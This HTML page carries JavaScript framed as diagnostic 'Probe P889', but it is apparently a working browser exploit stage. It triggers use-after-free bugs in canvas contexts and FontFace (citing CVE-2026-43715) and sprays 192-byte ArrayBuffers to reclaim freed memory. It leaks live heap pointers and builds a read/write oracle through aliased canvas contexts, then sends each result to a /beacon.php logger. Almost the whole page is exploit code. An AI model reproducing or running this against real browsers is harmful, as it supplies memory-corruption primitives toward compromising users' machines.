<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P889: 192-Byte Slab Crossover & Color Serialization Oracle</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P889...</div>
<h2>P889: 192-Byte Slab Crossover & Color Serialization Oracle</h2>
<pre id="log">Initializing diagnostic probe P889...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P889-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

function hex64(dv, off) {
  var lo = dv.getUint32(off, true);
  var hi = dv.getUint32(off + 4, true);
  return '0x' + hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8);
}

log('[*] Probe P889 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: Canvas UAF Pre-Setup (Establish Aliased Pair First)
 * ============================================================ */
var innerCtx1 = null, innerCtx2 = null;

var c1 = document.createElement('canvas');
c1.width = 32; c1.height = 32;
var opts1 = {};
Object.defineProperty(opts1, 'alpha', {
  get: function() {
    innerCtx1 = c1.getContext('2d');
    return true;
  }
});
c1.getContext('bitmaprenderer', opts1);

var c2 = document.createElement('canvas');
c2.width = 32; c2.height = 32;
var opts2 = {};
Object.defineProperty(opts2, 'alpha', {
  get: function() {
    innerCtx2 = c2.getContext('2d');
    return true;
  }
});
c2.getContext('bitmaprenderer', opts2);

var sprayCtxs = [];
for (var s = 0; s < 200; s++) {
  var c = document.createElement('canvas');
  c.width = 32; c.height = 32;
  var ctx = c.getContext('2d');
  ctx.lineWidth = 1000.0 + s;
  sprayCtxs.push(ctx);
}

var idx1 = -1, idx2 = -1;
try {
  var lw1 = innerCtx1.lineWidth;
  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
  var lw2 = innerCtx2.lineWidth;
  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
} catch(e) {}

log('[+] Phase 1: Aliased Canvas Established: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

/* ============================================================
 * PHASE 2: FontFace UAF (CVE-2026-43715) & 192-Byte Slab Spray
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs = [], ffired = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;
    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    // Immediately allocate 64 ArrayBuffer(192) to reclaim and map the 192B slab
    fabs = [];
    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));

    // Also trigger lineDash allocation of exactly 24 doubles (192 bytes!)
    if (innerCtx1) {
      try {
        var dashPattern = [];
        for (var d = 0; d < 24; d++) dashPattern.push(987654.321 + d);
        innerCtx1.setLineDash(dashPattern);
      } catch(e) {}
    }

    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

setTimeout(function() {
  delete FontFace.prototype.then;
  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  var fontDV = null;

  if (bestI >= 0 && bestNz >= 4) {
    fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
  }

  var deltaHQ = 0;
  if (H_hi !== 0 && q13hi !== 0 && H_hi === q13hi) {
    deltaHQ = H_lo - q13lo;
  }

  log('[+] Phase 2: Live Heap H = ' + Hstr + ' | q13 = ' + q13str + ' (Delta=' + deltaHQ + 'B, Slot #' + bestI + ')', 'ok');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + deltaHQ + '|slot=' + bestI);

  /* ============================================================
   * PHASE 3: 192-Byte Slab Crossover Detection
   * ============================================================ */
  var crossoverSlot = -1;
  var sampleVal = 0;

  // Search fabs for the double pattern 987654.321
  for (var s = 0; s < fabs.length; s++) {
    if (s === bestI) continue; // Skip the CSSFontFace reclaim slot
    var f64 = new Float64Array(fabs[s]);
    for (var k = 0; k < f64.length; k++) {
      if (Math.abs(f64[k] - 987654.321) < 0.01) {
        crossoverSlot = s;
        sampleVal = f64[k];
        break;
      }
    }
    if (crossoverSlot >= 0) break;
  }

  log('[+] Phase 3: 192B Slab Crossover: slot=' + crossoverSlot + ' (val=' + sampleVal + ')', crossoverSlot >= 0 ? 'hot' : 'info');
  syncBn('CROSSOVER', 'slot=' + crossoverSlot + '|val=' + sampleVal);

  /* ============================================================
   * PHASE 4: CanvasStyle Color Serialization Oracle
   * ============================================================ */
  var colorMatch = false, readStroke = '', readFill = '';
  if (idx1 >= 0 && sprayCtxs[idx1]) {
    try {
      // Write through innerCtx1
      innerCtx1.strokeStyle = 'rgba(18, 52, 86, 0.5)';
      innerCtx1.fillStyle = '#123456';

      // Read through sprayCtxs[idx1]
      readStroke = sprayCtxs[idx1].strokeStyle;
      readFill = sprayCtxs[idx1].fillStyle;

      colorMatch = (readFill === '#123456');
    } catch(e) {
      readStroke = 'err:' + e.message;
    }
  }

  log('[+] Phase 4: Color Serialization: fill=' + readFill + ' | stroke=' + readStroke + ' (match=' + colorMatch + ')', 'ok');
  syncBn('COLOR-ORACLE', 'fill=' + readFill + '|stroke=' + readStroke + '|match=' + colorMatch);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P889 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P889 Execution Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str + ' (Delta: ' + deltaHQ + 'B)', 'ok');
  log('    - Crossover Detected: Slot #' + crossoverSlot, crossoverSlot >= 0 ? 'hot' : 'info');
  log('    - Color Oracle: ' + readFill + ' / ' + readStroke + ' (match=' + colorMatch + ')', 'ok');
  log('    - Dual Canvas Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + deltaHQ + '|crossover=' + crossoverSlot + '|colorMatch=' + colorMatch + '|idx1=' + idx1 + '|idx2=' + idx2);

}, 400);
</script>
</body>
</html>
